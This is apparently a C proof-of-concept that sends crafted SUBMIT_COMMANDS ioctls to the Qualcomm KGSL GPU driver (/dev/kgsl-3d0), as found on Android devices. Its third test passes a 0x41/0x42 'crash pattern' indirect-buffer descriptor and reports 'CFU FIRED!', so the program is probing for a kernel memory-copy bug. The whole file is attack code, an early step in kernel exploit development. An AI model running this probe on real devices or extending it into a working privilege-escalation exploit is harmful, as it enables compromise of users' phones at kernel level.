#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>

#define KGSL_IOC(nr, sz) \
    (((uint32_t)3 << 30) | (((uint32_t)(sz)) << 16) | (((uint32_t)0x09) << 8) | ((uint32_t)(nr)))

int main(void) {
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { printf("open: %d\n", errno); return 1; }
    printf("fd=%d\n", fd);

    struct { uint32_t f; uint32_t id; } ctx = {0x12, 0};
    errno = 0; int r = ioctl(fd, KGSL_IOC(0x13, 0x08), &ctx);
    printf("CREATE(0x12): ret=%d id=%u errno=%d\n", r, ctx.id, errno);
    if (r < 0) { close(fd); return 1; }

    printf("\n=== SUBMIT_COMMANDS (64-bit native) ===\n");

    void *cmdlist = mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
    if (cmdlist == MAP_FAILED) { printf("mmap failed\n"); goto out; }
    memset(cmdlist, 0, 0x1000);

    /* ibdesc in cmdlist */
    struct { uint64_t gpuaddr; uint64_t sizedwords; } *ib = cmdlist;
    
    /* SUBMIT_COMMANDS struct: context_id(4) + flags(4) + cmdlist_ptr(8) 
       + cmdlist_sz(4) + numcmds(4) + timestamp(4) + pad... = 56 bytes */
    uint8_t sbuf[56];
    memset(sbuf, 0, 56);
    *(uint32_t*)(sbuf+0x00) = ctx.id;
    *(uint64_t*)(sbuf+0x08) = (uint64_t)(uintptr_t)cmdlist;
    *(uint32_t*)(sbuf+0x10) = 16;  /* cmdlist size = 1 ibdesc */
    *(uint32_t*)(sbuf+0x14) = 1;   /* numcmds */

    /* Test 1: zeros */
    ib[0].gpuaddr = 0; ib[0].sizedwords = 0;
    errno = 0; r = ioctl(fd, KGSL_IOC(0x3d, 0x38), sbuf);
    printf("  [gpuaddr=0, sz=0]: ret=%d errno=%d %s\n", r, errno, r==0?"✅":"");

    /* Test 2: valid-looking */
    ib[0].gpuaddr = 0x10000000ULL; ib[0].sizedwords = 1;
    errno = 0; r = ioctl(fd, KGSL_IOC(0x3d, 0x38), sbuf);
    printf("  [gpuaddr=0x10000000, sz=1]: ret=%d errno=%d %s\n", r, errno, r==0?"✅":"");

    /* Test 3: crash pattern */
    ib[0].gpuaddr = 0x4141414141414141ULL; ib[0].sizedwords = 0x4242424242424242ULL;
    errno = 0; r = ioctl(fd, KGSL_IOC(0x3d, 0x38), sbuf);
    printf("  [CRASH PATTERN]: ret=%d errno=%d %s\n", r, errno, r==0?"✅ CFU FIRED!":"");

    munmap(cmdlist, 0x1000);
out:
    ioctl(fd, KGSL_IOC(0x14, 0x04), &ctx.id);
    close(fd);
    return 0;
}
